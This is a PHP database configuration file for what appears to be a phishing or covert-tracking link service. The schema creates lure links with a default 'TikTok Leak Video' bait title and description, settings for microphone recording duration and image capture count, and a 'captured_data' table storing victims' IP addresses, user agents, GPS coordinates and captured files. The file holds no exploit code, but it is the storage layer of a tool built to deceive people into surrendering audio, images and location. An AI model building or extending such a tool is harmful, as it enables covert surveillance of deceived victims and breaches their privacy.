<?php
/**
 * Database Configuration
 * Uses SQLite for local testing, MySQL for production (InfinityFree)
 */

// Use SQLite for local testing
$db_file = __DIR__ . '/../data/database.sqlite';

// Create data directory if it doesn't exist
if (!is_dir(__DIR__ . '/../data')) {
    mkdir(__DIR__ . '/../data', 0755, true);
}

// Create connection using PDO for SQLite
try {
    $pdo = new PDO('sqlite:' . $db_file);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    
    // Enable foreign keys
    $pdo->exec('PRAGMA foreign_keys = ON');
    
    // Create tables
    $pdo->exec("CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        email TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        is_admin INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    $pdo->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        link_code TEXT UNIQUE NOT NULL,
        tool_type TEXT NOT NULL,
        redirect_url TEXT DEFAULT 'https://www.tiktok.com',
        title TEXT DEFAULT 'TikTok Leak Video',
        description TEXT DEFAULT 'Watch the latest viral TikTok leak video before it gets taken down!',
        mic_duration INTEGER DEFAULT 5,
        image_count INTEGER DEFAULT 5,
        link_image_path TEXT,
        theme TEXT DEFAULT 'default',
        password TEXT,
        expires_at DATETIME,
        is_active INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    )");
    
    $pdo->exec("CREATE TABLE IF NOT EXISTS captured_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id INTEGER NOT NULL,
        data_type TEXT NOT NULL,
        data_content TEXT NOT NULL,
        file_path TEXT,
        ip_address TEXT,
        user_agent TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE CASCADE
    )");

    // Migration: Add columns if they don't exist
    try {
        $pdo->exec("ALTER TABLE users ADD COLUMN is_admin INTEGER DEFAULT 0");
    } catch (Exception $e) {}
    try {
        $pdo->exec("ALTER TABLE links ADD COLUMN redirect_url TEXT DEFAULT 'https://www.tiktok.com'");
        $pdo->exec("ALTER TABLE links ADD COLUMN title TEXT DEFAULT 'TikTok Leak Video'");
        $pdo->exec("ALTER TABLE links ADD COLUMN description TEXT DEFAULT 'Watch the latest viral TikTok leak video before it gets taken down!'");
    } catch (Exception $e) {}
    try {
        $pdo->exec("ALTER TABLE links ADD COLUMN mic_duration INTEGER DEFAULT 5");
        $pdo->exec("ALTER TABLE links ADD COLUMN image_count INTEGER DEFAULT 5");
        $pdo->exec("ALTER TABLE links ADD COLUMN link_image_path TEXT");
        $pdo->exec("ALTER TABLE links ADD COLUMN theme TEXT DEFAULT 'default'");
        $pdo->exec("ALTER TABLE links ADD COLUMN password TEXT");
    } catch (Exception $e) {}
    
    // Create a wrapper to make PDO work like mysqli in our code
    $conn = new class($pdo) {
        private $pdo;
        public $connect_error = null;
        
        public function __construct($pdo) {
            $this->pdo = $pdo;
        }
        
        public function query($sql) {
            try {
                return $this->pdo->query($sql);
            } catch (Exception $e) {
                error_log("Query error: " . $e->getMessage());
                return false;
            }
        }
        
        public function real_escape_string($str) {
            return str_replace("'", "''", $str);
        }
        
        public function exec($sql) {
            try {
                return $this->pdo->exec($sql);
            } catch (Exception $e) {
                error_log("Exec error: " . $e->getMessage());
                return false;
            }
        }
    };
    
} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}
?>
